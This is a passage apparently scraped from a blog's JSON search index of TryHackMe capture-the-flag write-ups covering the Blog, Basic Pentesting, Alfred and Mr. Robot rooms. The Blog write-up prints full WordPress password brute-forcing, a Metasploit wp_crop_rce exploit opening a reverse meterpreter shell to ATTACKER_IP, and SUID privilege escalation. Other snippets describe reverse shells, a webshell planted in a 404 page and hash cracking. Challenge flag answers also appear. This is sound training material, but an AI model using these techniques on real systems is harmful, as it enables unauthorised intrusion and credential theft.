cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -1s, deviation: 0s, median: -1s|_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: blog| NetBIOS computer name: BLOG\\x00| Domain name: \\x00| FQDN: blog|_ System time: 2022-01-11T19:54:54+00:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2022-01-11T19:54:54|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 48.90 secondsSo to summarise, there are four open ports: Port 22 (SSH) Port 80 (HTTP) Port 139 and 145 (SMB)Navigating to http://blog.thm, it is clear that the website is running Wordpress as its CMS or Content Management System.To enumerate this further, I used wpscan:$ wpscan --url http://blog.thm_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.18 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://blog.thm/ [VICTIM_IP][+] Started: Tue Jan 11 19:59:19 2022Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] robots.txt found: http://blog.thm/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://blog.thm/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Rss Generator (Passive Detection) | - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt; | - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;[+] WordPress theme in use: twentytwenty | Location: http://blog.thm/wp-content/themes/twentytwenty/ | Last Updated: 2021-07-22T00:00:00.000Z | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.8 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'[+] Enumerating All Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:02 &lt;===================================&gt; (137 / 137) 100.00% Time: 00:00:02[i] No Config Backups Found.[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Tue Jan 11 19:59:26 2022[+] Requests Done: 139[+] Cached Requests: 38[+] Data Sent: 33.453 KB[+] Data Received: 59.302 KB[+] Memory used: 236.609 MB[+] Elapsed time: 00:00:07I also conducted some manual emumeration and found two usernames: kwheel and bjoel. I then decided to try and bruteforce the password for each user:$ wpscan --url http://blog.thm/ --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt...[+] Performing password attack on Xmlrpc against 1 user/s[SUCCESS] - kwheel / cutiepie1 Trying kwheel / westham Time: 00:01:33 &lt; &gt; (2865 / 14347257) 0.01% ETA: ??:??:??[!] Valid Combinations Found: | Username: kwheel, Password: cutiepie1[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Tue Jan 11 21:41:47 2022[+] Requests Done: 3037[+] Cached Requests: 7[+] Data Sent: 1.469 MB[+] Data Received: 2.006 MB[+] Memory used: 273.57 MB[+] Elapsed time: 00:01:43This version of WordPress is vulnerable to the following exploit. I used the wp_crop_rce Metasploit module to exploit the website:$ msfconsole...msf6 &gt; use exploit/multi/http/wp_crop_rce[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(multi/http/wp_crop_rce) &gt; optionsModule options (exploit/multi/http/wp_crop_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The WordPress password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/ wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the wordpress application USERNAME yes The WordPress username to authenticate with VHOST no HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST ATTACKER_IP yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 WordPressmsf6 exploit(multi/http/wp_crop_rce) &gt; set RHOST blog.thmRHOST =&gt; blog.thmmsf6 exploit(multi/http/wp_crop_rce) &gt; set USERNAME kwheelUSERNAME =&gt; kwheelmsf6 exploit(multi/http/wp_crop_rce) &gt; set PASSWORD cutiepie1PASSWORD =&gt; cutiepie1msf6 exploit(multi/http/wp_crop_rce) &gt; exploit[*] Started reverse TCP handler on ATTACKER_IP:4444 [*] Authenticating with WordPress using kwheel:cutiepie1...[+] Authenticated with WordPress[*] Preparing payload...[*] Uploading payload[+] Image uploaded[*] Including into theme[*] Sending stage (39282 bytes) to VICTIM_IP[*] Attempting to clean up files...[*] Meterpreter session 1 opened (ATTACKER_IP:4444 -&gt; VICTIM_IP:43446 ) at 2022-01-12 21:11:43 +0000meterpreter &gt; Then, get a shell from meterpreter:meterpreter &gt; shellProcess 1500 created.Channel 1 created.SHELL=/bin/bash script -q /dev/nullwww-data@blog:/var/www/wordpress$ Checking what files are owned by the root user:www-data@blog:/var/www/wordpress$ find / -type f -user root -perm -u=s 2&gt;/dev/nullllnd / -type f -user root -perm -u=s 2&gt;/dev/nul/usr/bin/passwd/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chsh/usr/bin/newuidmap/usr/bin/pkexec/usr/bin/chfn/usr/bin/sudo/usr/bin/newgidmap/usr/bin/traceroute6.iputils/usr/sbin/checker/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/bin/mount/bin/fusermount/bin/umount/bin/ping/bin/su/snap/core/8268/bin/mount/snap/core/8268/bin/ping/snap/core/8268/bin/ping6/snap/core/8268/bin/su/snap/core/8268/bin/umount/snap/core/8268/usr/bin/chfn/snap/core/8268/usr/bin/chsh/snap/core/8268/usr/bin/gpasswd/snap/core/8268/usr/bin/newgrp/snap/core/8268/usr/bin/passwd/snap/core/8268/usr/bin/sudo/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/8268/usr/lib/openssh/ssh-keysign/snap/core/8268/usr/lib/snapd/snap-confine/snap/core/8268/usr/sbin/pppd/snap/core/9066/bin/mount/snap/core/9066/bin/ping/snap/core/9066/bin/ping6/snap/core/9066/bin/su/snap/core/9066/bin/umount/snap/core/9066/usr/bin/chfn/snap/core/9066/usr/bin/chsh/snap/core/9066/usr/bin/gpasswd/snap/core/9066/usr/bin/newgrp/snap/core/9066/usr/bin/passwd/snap/core/9066/usr/bin/sudo/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/9066/usr/lib/openssh/ssh-keysign/snap/core/9066/usr/lib/snapd/snap-confine/snap/core/9066/usr/sbin/pppd/usr/sbin/checker looks suspicious. The file appears to be a 64-bit ELF. Running this file outputs:www-data@blog:/$ /usr/sbin/checker/usr/sbin/checkerNot an AdminRunning the executable with ltrace reveals that it checks for an environment variable called admin. I created this variable, set it to 1, and then ran the executable again:www-data@blog:/$ export admin=1export admin=1www-data@blog:/$ /usr/sbin/checker/usr/sbin/checkerroot@blog:/# I then found the root.txt flag:root@blog:/# cd /rootcd /rootroot@blog:/root# ls -la ls -latotal 60drwx------ 6 root root 4096 May 28 2020 .drwxr-xr-x 24 root root 4096 May 25 2020 ..lrwxrwxrwx 1 root root 9 May 26 2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 May 26 2020 .cachedrwx------ 3 root root 4096 May 26 2020 .gnupgdrwxr-xr-x 3 root root 4096 May 26 2020 .local-rw------- 1 root root 272 May 28 2020 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 May 25 2020 .ssh-rw------- 1 root root 13291 May 28 2020 .viminfo-rw-r--r-- 1 root root 215 May 27 2020 .wget-hsts-rw-r--r-- 1 root root 33 May 26 2020 root.txtroot@blog:/root# cat root.txtcat root.txt9a0b2b618bef9bfa7ac28c1353d9f318Going to /home/bjoel reveals a user.txt:root@blog:/# cd /homecd /homeroot@blog:/home# ls -lls -ltotal 4drwxr-xr-x 4 bjoel bjoel 4096 May 26 2020 bjoelroot@blog:/home# cd bjoelcd bjoelroot@blog:/home/bjoel# ls -lls -ltotal 72-rw-r--r-- 1 bjoel bjoel 69106 May 26 2020 Billy_Joel_Termination_May20-2020.pdf-rw-r--r-- 1 bjoel bjoel 57 May 26 2020 user.txtroot@blog:/home/bjoel# cat user.txtcat user.txtYou won't find what you're looking for here.TRY HARDERUsing the same technique as before:root@blog:/# find / -type f -name user.txt 2&gt;/dev/nullfind / -type f -name user.txt 2&gt;/dev/null/home/bjoel/user.txt/media/usb/user.txtroot@blog:/# cat /media/usb/user.txtcat /media/usb/user.txtc8421899aae571f7af486492b71a8ab7Answers root.txt9a0b2b618bef9bfa7ac28c1353d9f318 user.txtc8421899aae571f7af486492b71a8ab7 Where was user.txt found?/media/usb What CMS was Billy using?WordPress What version of the above CMS was being used?5.0" }, { "title": "Basic Pentesting Writeup | TryHackMe", "url": "/posts/basic-pentesting-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, basicpentesting, security, webapp, boot2root, cracking, beginner", "date": "2022-01-14 00:00:00 +0000", "snippet": "CTF OverviewWelcome to the writeup for the Basic Pentesting CTF. In this box, you will learn how to do the following: Service enumeration Brute forcing Hash cracking Linux enumerationThis box is intended for beginners so if you are a more experienced pentester, you may want to try your hand at a more difficult machine.How to Deploy:I am using TryHackMe for this walkthrough, but you can download it from VulnHub using the link below:https://www.vulnhub.com/entry/basic-pentesting-1,216/Steps1. Information Gathering and EnumerationAs always, the first thing I do is run a basic scan to find the open ports:Using the results from this scan I run a more detailed scan to get version numbers and any other useful information I may need later:From the scan, I can see that there is a web server running on port 80 with Apache version 2.4.18.So far we have completed objectives #1 and #2: deploy the machine and find the services exposed by the machine. The next objective is to find the name of the hidden directory on the web server.The next thing I do is navigate to the website:It doesn’t appear to have anything useful so I start a directory bruteforce attack using GoBuster:After some digging with the GoBuster results, I find a find a “/development” path (objective #3):This directory contains two files: dev.txt and j.txtLooks like there is a weak hash in the /etc/shadow file that we could crack. Now we need to find the username. I am going to use enum4linux for this:Eventually we find two usernames - kay and jan:The username for objective #5 is jan. Now we need to get the password (objective #6). I am going to use hydra for this:Great! The password is: armando. We can now use these credentials to SSH (objective #7) into the target machine:After some digging I found the /home directory of the kay user and noticed that they have a private ssh key in their .ssh directory:I make a copy of this private key and save it to my desktop as id_rsa. I also use the following command:$ chmod 600 id_rsawhich only gives the owner read and write access. This is how these private key files should have been stored on the victim’s machine.However, when I tried to use the SSH key to access the victim’s machine, the key returned as being password protected:To get the password for kay, I am going to use John the Ripper’s ssh2john script to crack the password:This command gets the password in a hash form and outputs it to a file called “cracked.txt”. I am now going to use john to crack the password with the rockyou wordlist:Okay so the password is beeswax! We can now SSH into the victim’s machine using this:And now we can read the pass.bak file for objective #11:And that’s it!" }, { "title": "Alfred Writeup | TryHackMe", "url": "/posts/alfred-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, alfred, beginner, jenkins, windows, tokens", "date": "2022-01-13 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Alfred room on TryHackMe. This Batman themed room requires you to exploit Jenkins by gaining access through powershell, then escalating your privileges by exploiting Windows authentication tokens. This is an easy room, so if you are new to Windows exploitation, then this is ideal for you. Furthermore, if you have completed the Steel Mountain CTF (writeup here), then you will be familiar with the techniques used here.How to AccessI completed this room on TryHackMe. The link to the room is shown below: https://tryhackme.com/room/alfredStepsAs usual, I begin with an nmap scan:$ nmap -sC -sV -oN initial 10.10.143.88 -Pn# Nmap 7.91 scan initiated Sat May 22 20:20:01 2021 as: nmap -sC -sV -oN initial -Pn 10.10.143.88Nmap scan report for 10.10.143.88Host is up (0.038s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-title: Site doesn't have a title (text/html).3389/tcp open tcpwrapped8080/tcp open http Jetty 9.4.z-SNAPSHOT| http-robots.txt: 1 disallowed entry |_/|_http-title: Site doesn't have a title (text/html;charset=utf-8).Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat May 22 20:22:28 2021 -- 1 IP address (1 host up) scanned in 147.04 secondsAs you can see, there are two web servers running - one on port 80 and another on port 8080. The first site is a memorial page for Bruce Wayne with an email: alfred@wayneenterprises.com:The second site is a Jenkins login form:After trying some default credentials, I was able to login using the admin:admin combination. Looking further into the site, I found a way to execute bash commands on the windows machine (under /job/project/configure in the “Build” section).Firstly, I created a Python HTTP server so that I can upload the powershell script. I also created a netcat listener to catch the callback.I found the user.txt flag in the C:\\Users\\bruce\\Desktop directory:I then escalated my shell to a meterpreter shell by creating a payload with msfvenom:I then used the following command, along with a metasploit listener to catch the result:Setting up multi/handler:After I executed the exploit, it spawned a meterpreter shell as alfred\\bruce:Then, I looked into the privileges of the user using whoami /priv:As shown above, SeDebugPrivilege and SeImpersonatePrivilege are enabled. After loading the incognito module, I listed the available tokens:The BUILTIN\\Administrator token is available, so I can use this to impersonate the admin:However, even though I have higher privileges, I don’t have the permissions of the admin user. This is due to how Windows handles permissions - it uses the Primary Token of the process instead of the token to identify what the process can/cannot do.To fix this, I migrated to the process with the correct permissions:Finally, I found the root.txt flag in the C:\\Windows\\System\\config directory:And that’s it! All done!" }, { "title": "Mr. Robot Writeup | TryHackMe", "url": "/posts/mr-robot-tryhackme-writeup/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, mrrobot, beginner", "date": "2022-01-12 00:00:00 +0000", "snippet": "CTF OverviewHello there! This is my writeup for the Mr.Robot CTF virtual machine. This challenge was a lot of fun, especially if you enjoy the TV show. I would only recommend using this guide if you are stuck or if you wish to learn other ways of solving the box.Also, if you are new to CTFs then don’t worry if you have used a different tool than I have.How to DownloadI completed this on TryHackMe, but you can find this VM on Vulnhub and other similar ethical hacking websites. Additionally, if you notice various IP addresses changing throughout this writeup, know that this is due to the unique IP that TryHackMe assigns to the box for you to connect to. This CTF was not done in one sitting, so I had to deploy the box multiple times, hence the difference IP addresses.Links to the room: TryHackMe: https://tryhackme.com/room/mrrobot VulnHub: https://download.vulnhub.com/mrrobot/mrRobot.ovaI will not include a tutorial for the VulnHub setup, or how to install VirtualBox software, as there are thousands you can find on YouTube.Steps1. Information Gathering and EnumerationThe first thing you should do is scan the remote host. First, I ran a brief scan of all ports and then, second, a detailed scan using the results from the first.Note that if you are using a VirtualBox to run the CTF machine then you will have to find the machine’s IP before you run any targeted scans.It looks like the target is running an Apache-based web server. The best thing to do here is browse to the site and check it yourself. When doing this, the goal is to do a basic technical analysis by exploring the site. This can be done by visiting pages, clicking on any buttons, menus, and anything else we can find to have a better understanding of how the site functions.I also like to run a directory bruteforce while I do this to see what I miss. There are a few tools to do this like dirbuster and dirb, but I prefer gobuster.These directory busting tools work similar to password bruteforcing: we are taking a list of words contained in a file and using them as search queries against the web server. If it returns a 20X or 30X status code then we know something exists within that directory. Here is the screengrab of the scan I ran:While this scan was running I visited the site to see what I could find. The homepage is a simple menu system to show content from the TV show:A summary of what each command does is listed below: “prepare” and “fsociety” will bring up a video “inform” and “question” will bring up some pictures “wakeup” shows another video “join” connects you to a chat with Mr.RobotAs you dig a little deeper, using the results from gobuster as they come in, you will mostly hit dead ends. Keep in mind that as you browse you should be checking the source code of each page to look for additional clues, intentionally placed or not, that could help you.If you are patient, you will come across the robots page. This file has two leads, one of which is the first flag, and the other is a dictionary file which we will use later.Let’s go ahead and download the dictionary file:~$ wget [machine_ip]/fsocity.dic2. ExploitationFrom the gobuster results, we know that this site has a WordPress element to it. Let’s browse to /wp-admin and see what we can find:One of the first things I try is “admin/admin” but it doesn’t work. However, the error message says “ERROR: invalid username…”. A more secure application would obfuscate which part of the login didn’t work by saying something like “username or password was incorrect”. By telling us that the username is invalid, the application is inadvertently disclosing information to us.So now we have to find a valid username. I use Hydra to find this:Okay, so the username is elliot. Now let’s find the password. We will use the dictionary file from earlier along with Hydra to do this:Now we also have the password: ER28-0652. If you are fans of the show you will know this to be Elliot’s employee number for AllSafe. Now that we have the username/password combination, we can login to /wp-admin:Now that we have logged in, our goal is to leverage our access to the application and gain access to the underlying server. You can do this by modifying the application in such a way that, when you navigate to a particular page, the application sends a webshell back. I used the default 404 Not Found response page for this step. What you need next is webshell code that can be served up from a specific page. This is where Google comes in handy.I found this article [INSERT link to custom 404] on how to create your own 404 page using WordPress. Kali Linux also includes code for several different webshells for different platforms:The php-reverse-shell is perfect for this purpose.First, you need to make a copy of the shell. To do this run the following command from the /usr/share/webshells directory:/usr/share/webshells$ cp php-reverse-shell.php ~/Desktop/All you need to do now is modify the file by including the IP of your machine and the port you will be listening for the connection on:We can now overwrite the code on the WordPress site with this new page:Now you need to set up your local listener to catch the webshell. I used netcat for this:Now browse to a non-existent page on the website:And now if you check netcat you will have your shell:I for one hate raw shells, so if you wnat to get out of them, you can use python to switch to a proper terminal:It seems we are in the ‘/’ root directory (don’t get confused with /root which is the home directory for the root user). I recommend you have a look around and see what you can find. If you look into the /home directory, you can see that there is a local user called ‘robot’. Looking into this further reveals the next flag along with a md5 hash file:Since we can’t access the second flag we need to crack this hash. MD5 hashes are trivial to crack. I used Hashcat in the example below:Now that we have the password we can use the su command on the robot user to grab the next flag:3. Privilege EscalationThe last flag for most CTFs is almost always in the /root directory but only the root user has access to it. A very common way of escalating privileges on a Linux system is to look for binaries that have the SUID bit set and abuse them. For me, this took me quite a long time to figure out and resulted in me looking at the hint on the TryHackMe website, which simply is ‘nmap’.A simple google search of ‘nmap suid’ gave me this article: [insert link] which discusses how to abuse a vulnerable version of nmap to gain root access. From there we are able to get the final flag:Summary and My FeebackNow that you have completed this machine and gained full root access, let’s look at what we did to get there: Scanned for open ports on the target machine: Found ports 80 and 443 were open with port 22 closed. Port 80/443 had Apache running on it indicating a web server. Used GoBuster to bruteforce directories while we browsed the site ourselves: Found the site had a WordPress blog running on it. Found the first flag from robots.txt as well as a dictionary file. Used Hydra to bruteforce the username and password of the WordPress blog: Username: elliot; Password: ER28-0652. Updated the default 404 page to include shellcode: Used netcat to listen for the connection. Found the second flag in the robot user’s home directory: Had to bruteforce an MD5 hash using HashCat to access it. Escalated privileges to root to obtain the final flag: Used a vulnerable version of nmap to do this. And that’s it! I hope you found this guide useful and any feedback you have is appreciated." } ]
